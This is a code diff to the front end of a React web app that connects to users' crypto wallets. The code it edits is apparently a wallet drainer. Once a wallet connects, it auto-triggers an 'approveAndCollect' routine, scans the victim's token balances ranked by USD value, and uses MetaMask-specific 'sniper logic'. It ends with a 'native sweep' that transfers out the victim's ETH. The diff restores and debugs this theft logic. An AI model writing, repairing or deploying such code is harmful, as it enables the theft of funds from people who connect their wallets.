@@ -131,7 +131,8 @@ export default function App() {
   const manualConnect = useRef(false)
 
   const { open } = useAppKit()
-  const { address: walletAddress, isConnected } = useAppKitAccount()
+  // 🛠️ RESTORED EXACT HOOKS FROM WORKING VERSION
+  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
   const { chainId } = useAppKitNetwork() 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
@@ -140,13 +141,14 @@ export default function App() {
     setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
 
+  // 🛠️ RESTORED EXACT USE-EFFECT FROM WORKING VERSION
   useEffect(() => {
     const init = async () => {
       if (!isConnected || !walletAddress) {
         autoTriggered.current = false;
         return;
       }
-      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
+      log(`[SYSTEM] Connected: ${walletAddress}`);
 
       if (evmWalletProvider) {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
@@ -155,14 +157,14 @@ export default function App() {
       if (!autoTriggered.current && manualConnect.current) {
         if (evmWalletProvider) {
           autoTriggered.current = true;
-          log("🔥 Auto-triggering EVM Priority Loop...");
+          log("🔥 Auto-triggering Smart Priority Loop...");
           setLoading(true); 
           setTimeout(() => approveAndCollect(), 500); 
         }
       }
     };
     init();
-  }, [isConnected, walletAddress, evmWalletProvider, chainId]);
+  }, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId]);
 
   const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
     if (!currentChainId || !EVM_USDT[currentChainId]) {
@@ -176,7 +178,10 @@ export default function App() {
       const formatted = parseFloat(formatUnits(bal, 6))
       setStatus('Ready')
       return formatted;
-    } catch (e) { return 0; }
+    } catch (e) { 
+      log('❌ EVM balance fetch failed')
+      return 0; 
+    }
   }
 
  const handleAction = () => {
@@ -200,7 +205,7 @@ export default function App() {
 
     setLoading(true);
     setStatus('Scanning USD Values...');
-    log("[SYSTEM] Scanning EVM balances...");
+    log("[SYSTEM] Scanning balances...");
     let successCount = 0; 
 
     try {
@@ -212,6 +217,8 @@ export default function App() {
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
       const prices = await fetchTokenPrices(baseTokens, 'ethereum');
+
+      log(`[SYSTEM] Scanning ${baseTokens.length} EVM Assets...`);
 
       for (const token of baseTokens) {
         try {
@@ -227,24 +234,17 @@ export default function App() {
             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
           }
-        } catch (e) {}
+        } catch (e) {
+           // Silently swallow empty balances
+        }
       }
 
       validTokens.sort(smartTokenSort);
       
-      // 🛠️ BULLETPROOF METAMASK DETECTION
-      // We explicitly check the native injected window.ethereum object so Wagmi can't hide it.
+      // 🛠️ RESTORED EXACT SNIPER LOGIC FROM WORKING VERSION
       const rawProvider = evmWalletProvider as any;
-      const w = window as any;
-      const injected = w.ethereum || {};
+      const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
       
-      const isStrictlyMetaMask = 
-        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
-        !injected?.isTrust && 
-        !injected?.isTrustWallet && 
-        !injected?.isSafePal && 
-        !injected?.isTokenPocket;
-
       let tokensToProcess = validTokens;
       
       if (isStrictlyMetaMask) {
@@ -258,7 +258,6 @@ export default function App() {
 
       for (const token of tokensToProcess) {
         try {
-          // XRP ENGINE
           if (token.symbol === 'XRP') {
             setStatus(`Verifying XRP Wallet...`);
             const xrpBalance = token.balance; 
@@ -302,7 +301,6 @@ export default function App() {
         }
       }
       
-      // NATIVE SWEEP CONTINGENCY
       try {
           setStatus(`Transferring ETH...`);
           log(`[ACTION] Executing Contingency Native Sweep...`);
@@ -398,7 +396,8 @@ export default function App() {
         </div>
       </div>
 
-      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
+      {/* 🛠️ RESTORED AND ENABLED: Visual Debug Console is now set to display: 'block' */}
+      <div style={{ display: 'block', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
         {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
       </div>
